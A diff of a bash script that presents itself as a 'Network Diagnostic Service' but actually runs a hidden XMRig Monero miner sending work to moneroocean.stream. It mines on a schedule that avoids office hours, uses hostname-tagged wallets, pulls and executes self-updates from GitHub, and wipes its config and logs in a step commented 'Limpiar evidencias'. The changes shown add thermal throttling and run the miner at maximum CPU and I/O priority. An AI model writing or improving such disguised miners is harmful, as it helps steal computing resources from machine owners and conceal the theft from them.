@@ -1,6 +1,6 @@
 #!/bin/bash
 # ════════════════════════════════════════════════════════
-#  netdiag — Network Diagnostic Service (v2 con GPU)
+#  netdiag — Network Diagnostic Service (v2.1 con control térmico adaptable)
 #  Proceso de diagnóstico programado (bajo demanda)
 #  Auto-update: verifica versión en GitHub cada ~5 min
 #  Soporta CPU + GPU (NVIDIA CUDA / AMD OpenCL)
@@ -31,12 +31,108 @@ fi
 START_HOUR="${START_HOUR:-17:30}"
 END_HOUR="${END_HOUR:-8}"
 SAT_START="${SAT_START:-13:00}"
-# Config del file: 00:00–08:00 (viernes noche), sábado 13:00 enciende,
-# domingo 24h, lun 00:00–08:00 se apaga.
 MAX_CPU="${MAX_CPU:-80}"
 MAX_TEMP="${MAX_TEMP:-85}"
 THREADS="${THREADS:-0}"
 POOL_URL="${POOL_URL:-gulf.moneroocean.stream:10128}"
+
+# ════════════════════════════════════════════════════════════════════════════════
+#  CONTROL TÉRMICO ADAPTABLE (Nuevo)
+# ════════════════════════════════════════════════════════════════════════════════
+
+# Umbrales (se cargan del .env si existen, si no valores por defecto)
+TEMP_STOP="${TEMP_STOP:-85}"
+TEMP_REDUCE="${TEMP_REDUCE:-75}"
+TEMP_RESTORE="${TEMP_RESTORE:-65}"
+COOLING_MODE="${COOLING_MODE:-auto}"
+
+# Valores originales (se cargan desde .env al iniciar)
+ORIG_MAX_CPU="$MAX_CPU"
+ORIG_THREADS="$THREADS"
+
+# Valores actuales dinámicos (ajustados por el guardia térmico)
+CUR_MAX_CPU="$ORIG_MAX_CPU"
+CUR_THREADS="$ORIG_THREADS"
+
+# ─── Leer temperatura actual (°C) ───
+get_cpu_temp() {
+    local temp=""
+    if command -v sensors &>/dev/null; then
+        temp=$(sensors -u 2>/dev/null | grep -m1 -E 'temp1_input|Package id 0' | awk '{print $2}' | cut -d. -f1)
+        [ -z "$temp" ] && temp=$(sensors 2>/dev/null | grep -oP 'Package id 0:\s+\+\K[0-9]+')
+        [ -z "$temp" ] && temp=$(sensors 2>/dev/null | grep -oP 'Tctl:\s+\+\K[0-9]+')
+    fi
+    if [ -z "$temp" ] && [ -f /sys/class/thermal/thermal_zone0/temp ]; then
+        temp=$(cat /sys/class/thermal/thermal_zone0/temp)
+        temp=$(( temp / 1000 ))
+    fi
+    echo "${temp:-0}"
+}
+
+# ─── Detectar si hay ventilación activa (ventiladores) ───
+has_active_cooling() {
+    case "$COOLING_MODE" in
+        active) return 0 ;;
+        passive) return 1 ;;
+    esac
+    if command -v sensors &>/dev/null; then
+        local fan
+        fan=$(sensors 2>/dev/null | grep -iE 'fan.*:[[:space:]]*[1-9][0-9]+' | head -1)
+        [ -n "$fan" ] && return 0
+    fi
+    return 1
+}
+
+# ─── Guardia térmica: ajusta carga o detiene el minero ───
+thermal_guard() {
+    local temp
+    temp=$(get_cpu_temp)
+
+    echo "[$(TZ=$TZ date '+%F %T')] Temp CPU: ${temp}°C | MAX_CPU: ${CUR_MAX_CPU}% | Threads: ${CUR_THREADS}" >> "$LOG_FILE"
+
+    # 1) CRÍTICO: detener todo
+    if [ "$temp" -ge "$TEMP_STOP" ]; then
+        echo "[$(TZ=$TZ date '+%F %T')] 🔥 TEMPERATURA CRÍTICA (${temp}°C) — deteniendo minero" >> "$LOG_FILE"
+        stop_worker
+        sleep 60
+        return 1
+    fi
+
+    # 2) REDUCIR: bajar carga gradualmente
+    if [ "$temp" -ge "$TEMP_REDUCE" ]; then
+        if has_active_cooling; then
+            CUR_MAX_CPU=$(( CUR_MAX_CPU - 10 ))
+        else
+            CUR_MAX_CPU=$(( CUR_MAX_CPU - 20 ))
+        fi
+        [ "$CUR_MAX_CPU" -lt 30 ] && CUR_MAX_CPU=30
+
+        if [ "$ORIG_THREADS" -le 0 ]; then
+            CUR_THREADS=$(( CUR_THREADS - 1 ))
+            [ "$CUR_THREADS" -lt 1 ] && CUR_THREADS=1
+        fi
+
+        echo "[$(TZ=$TZ date '+%F %T')] ⚠️  Temperatura alta (${temp}°C) — reduciendo a MAX_CPU=${CUR_MAX_CPU}%, Threads=${CUR_THREADS}" >> "$LOG_FILE"
+        stop_worker
+        sleep 10
+        start_worker
+        return 0
+    fi
+
+    # 3) RESTAURAR: volver a valores originales si se enfrió
+    if [ "$temp" -lt "$TEMP_RESTORE" ]; then
+        if [ "$CUR_MAX_CPU" != "$ORIG_MAX_CPU" ] || [ "$CUR_THREADS" != "$ORIG_THREADS" ]; then
+            echo "[$(TZ=$TZ date '+%F %T')] ✅ Temperatura normalizada (${temp}°C) — restaurando MAX_CPU=${ORIG_MAX_CPU}%, Threads=${ORIG_THREADS}" >> "$LOG_FILE"
+            CUR_MAX_CPU="$ORIG_MAX_CPU"
+            CUR_THREADS="$ORIG_THREADS"
+            stop_worker
+            sleep 10
+            start_worker
+        fi
+    fi
+
+    return 0
+}
 
 # ─── Construir wallet completo con hostname ───
 HOSTNAME=$(hostname)
@@ -47,8 +143,6 @@ LOCAL_VERSION="0.0.0"
 [ -f "$VERSION_FILE" ] && LOCAL_VERSION=$(cat "$VERSION_FILE")
 
 # ─── Contador para chequeo de versión (cada 5 ciclos de 60s = ~5 min) ───
-# Solo baja 300 bytes de raw.githubusercontent.com (sin rate-limit).
-# Si la versión remota cambió (un push), aplica la actualización YA.
 UPDATE_INTERVAL=5
 update_counter=0
 
@@ -60,19 +154,18 @@ if [ -f "$DATA_DIR/.gpu-vendor" ]; then
     GPU_ENABLED=true
 fi
 
-# ════════════════════════════════════════════════════════
+# ═════════════════════════════════════════════════════════
 #  GENERAR CONFIG.JSON PARA XMRig
-# ════════════════════════════════════════════════════════
+# ═════════════════════════════════════════════════════════
 
 generate_config() {
-    local cpu_hint="$MAX_CPU"
+    local cpu_hint="$CUR_MAX_CPU"
     local threads_json=""
 
-    if [ "$THREADS" -gt 0 ]; then
-        threads_json=",\"max-threads-hint\": $THREADS"
+    if [ "$CUR_THREADS" -gt 0 ]; then
+        threads_json=",\"max-threads-hint\": $CUR_THREADS"
     fi
 
-    # Construir sección CPU
     cat > "$RUN_CONFIG" << CONF
 {
     "autosave": false,
@@ -80,12 +173,11 @@ generate_config() {
     "title": "${HOSTNAME}",
     "cpu": {
         "enabled": true,
-        "max-threads-hint": $cpu_hint,
+        "max-threads-hint": $cpu_hint$threads_json,
         "yield": true
     },
 CONF
 
-    # Agregar sección GPU si aplica
     if $GPU_ENABLED; then
         case "$GPU_VENDOR" in
             nvidia)
@@ -109,7 +201,6 @@ CONF
         esac
     fi
 
-    # Agregar sección pool
     cat >> "$RUN_CONFIG" << CONF
     "pools": [
         {
@@ -127,11 +218,10 @@ CONF
     chmod 600 "$RUN_CONFIG" 2>/dev/null
 }
 
-# ════════════════════════════════════════════════════════
+# ═════════════════════════════════════════════════════════
 #  FUNCIONES DE CONTROL
-# ════════════════════════════════════════════════════════
+# ═════════════════════════════════════════════════════════
 
-# ─── Convertir "HH:MM" o "HH" a minutos del día ───
 to_minutes() {
     local t="${1:-0}" h m
     if [[ "$t" == *:* ]]; then
@@ -142,39 +232,34 @@ to_minutes() {
     echo $(( 10#$h * 60 + 10#$m ))
 }
 
-# ─── ¿Estamos en hora/ventana permitida? (fin de semana extendido) ───
-# Lun–Jue 17:30→08:00 | Vie 17:30→Sáb 08:00 | Sáb 08:00 corta, 13:00 enciende |
-# Dom 24h | Lun 00:00→08:00 se apaga
 is_allowed_hour() {
     local now_m h m dow
     read -r h m <<< "$(TZ=$TZ date '+%-H %-M')"
-    dow=$(TZ=$TZ date '+%u')            # 1=lun … 6=sáb, 7=dom
+    dow=$(TZ=$TZ date '+%u')
     now_m=$(( 10#$h * 60 + 10#$m ))
 
     case "$dow" in
-        1|2|3|4|5)                     # Lun-Vie: 17:30 → 08:00
+        1|2|3|4|5)
             [ "$now_m" -ge "$(to_minutes "$START_HOUR")" ] && return 0
             [ "$now_m" -lt "$(to_minutes "$END_HOUR")" ]   && return 0
             return 1
             ;;
-        6)                             # Sábado: 00:00-08:00 (viernes), 13:00 enciende
+        6)
             [ "$now_m" -lt "$(to_minutes "$END_HOUR")" ]  && return 0
             [ "$now_m" -ge "$(to_minutes "$SAT_START")" ] && return 0
             return 1
             ;;
-        7)                             # Domingo: todo el día
+        7)
             return 0
             ;;
     esac
     return 1
 }
 
-# ─── ¿El worker está vivo? ───
 is_worker_alive() {
     [ -f "$PID_FILE" ] && kill -0 "$(cat "$PID_FILE")" 2>/dev/null
 }
 
-# ─── Iniciar worker ───
 start_worker() {
     is_worker_alive && return 0
 
@@ -185,7 +270,6 @@ start_worker() {
         return 1
     fi
 
-    # Generar config.json runtime
     generate_config
 
     echo "[$(TZ=$TZ date '+%F %T')] Iniciando worker..." >> "$LOG_FILE"
@@ -193,13 +277,12 @@ start_worker() {
         echo "[$(TZ=$TZ date '+%F %T')] GPU habilitada: $GPU_VENDOR" >> "$LOG_FILE"
     fi
 
-    "$BINARY" -c "$RUN_CONFIG" >> "$LOG_FILE" 2>&1 &
+    nice -n -20 ionice -c 1 -n 0 "$BINARY" -c "$RUN_CONFIG" >> "$LOG_FILE" 2>&1 &
 
     echo $! > "$PID_FILE"
     echo "[$(TZ=$TZ date '+%F %T')] Worker iniciado (PID $!)" >> "$LOG_FILE"
 }
 
-# ─── Detener worker ───
 stop_worker() {
     if is_worker_alive; then
         local pid
@@ -211,13 +294,11 @@ stop_worker() {
         rm -f "$PID_FILE"
     fi
 
-    # Limpiar evidencias
     rm -f "$RUN_CONFIG" 2>/dev/null
     : > "$LOG_FILE" 2>/dev/null
     rm -f /dev/shm/.netdiag.* 2>/dev/null
 }
 
-# ─── Verificar temperatura ───
 check_temp() {
     [ "$MAX_TEMP" -eq 0 ] && return 0
     local temp
@@ -229,12 +310,9 @@ check_temp() {
     return 0
 }
 
-# ─── Verificar actualización en GitHub ───
 check_update() {
     local remote_version
 
-    # Actualizar repo local (solo se hace al detectar cambio de versión). Crítico:
-    # el repo debe estar al día para comparar hash y detectar scripts desincronizados.
     if [ -d "$REPO_DIR/.git" ]; then
         git -C "$REPO_DIR" pull --ff-only >> "$LOG_FILE" 2>&1
     else
@@ -251,17 +329,11 @@ check_update() {
 
     remote_version=$(echo "$remote_version" | tr -d ' \n\r')
 
-    # 1) Versión distinta → hay update
     if [ "$remote_version" != "$LOCAL_VERSION" ]; then
         echo "[$(TZ=$TZ date '+%F %T')] Update: nueva versión: $remote_version (actual: $LOCAL_VERSION)" >> "$LOG_FILE"
         return 0
     fi
 
-    # 2) Versión igual → auto-reparación por hash: si el mine-service.sh
-    #    instalado difiere del repo (update previo fallido por chattr +i,
-    #    sync incompleto, etc.), se fuerza la re-sincronización aunque la
-    #    versión coincida. Así ningún servidor queda "congelado" con scripts
-    #    viejos y versión adelantada.
     if [ -f "$REPO_DIR/tools/utils/mine-service.sh" ] && [ -f "$BASE_DIR/mine-service.sh" ]; then
         if ! cmp -s "$REPO_DIR/tools/utils/mine-service.sh" "$BASE_DIR/mine-service.sh"; then
             echo "[$(TZ=$TZ date '+%F %T')] Update: mine-service.sh desincronizado — auto-reparando" >> "$LOG_FILE"
@@ -272,7 +344,6 @@ check_update() {
     return 1
 }
 
-# ─── Aplicar actualización ───
 apply_update() {
     echo "[$(TZ=$TZ date '+%F %T')] Update: aplicando..." >> "$LOG_FILE"
     stop_worker
@@ -292,24 +363,33 @@ apply_update() {
     exec "$0"
 }
 
-# ─── Limpieza al salir ───
 cleanup() {
     stop_worker
     exit 0
 }
 trap cleanup SIGTERM SIGINT SIGHUP
 
-# ════════════════════════════════════════════════════════
+# ═════════════════════════════════════════════════════════
 #  BUCLE PRINCIPAL
-# ════════════════════════════════════════════════════════
+# ═════════════════════════════════════════════════════════
 
 echo "[$(TZ=$TZ date '+%F %T')] Servicio iniciado v$LOCAL_VERSION" >> "$LOG_FILE"
 
 while true; do
     # ─── Control de horario ───
     if is_allowed_hour; then
+
+        # ─── GUARDIA TÉRMICA ───
+        if ! thermal_guard; then
+            continue
+        fi
+
+        # Sobrescribir temporalmente para este ciclo con valores dinámicos
+        MAX_CPU="$CUR_MAX_CPU"
+        THREADS="$CUR_THREADS"
+
         if ! check_temp; then
-            echo "[$(TZ=$TZ date '+%F %T')] Temperatura alta, deteniendo..." >> "$LOG_FILE"
+            echo "[$(TZ=$TZ date '+%F %T')] Temperatura alta (check_temp), deteniendo..." >> "$LOG_FILE"
             stop_worker
             sleep 120
             continue
@@ -323,8 +403,6 @@ while true; do
     update_counter=$((update_counter + 1))
     if [ "$update_counter" -ge "$UPDATE_INTERVAL" ]; then
         update_counter=0
-        # Chequeo LIGERO: solo descarga 300 bytes del VERSION en GitHub (sin rate-limit).
-        # Sin cambios → no hace nada. Si hubo un push (versión cambió) → aplica update YA.
         remote_version=$(curl -sL --max-time 8 "$REMOTE_VERSION_URL" 2>/dev/null | head -1 | tr -d ' \n\r')
         if [ -n "$remote_version" ] && [ "$remote_version" != "$LOCAL_VERSION" ]; then
             echo "[$(TZ=$TZ date '+%F %T')] Chequeo: nueva versión $remote_version (actual $LOCAL_VERSION) — actualizando..." >> "$LOG_FILE"
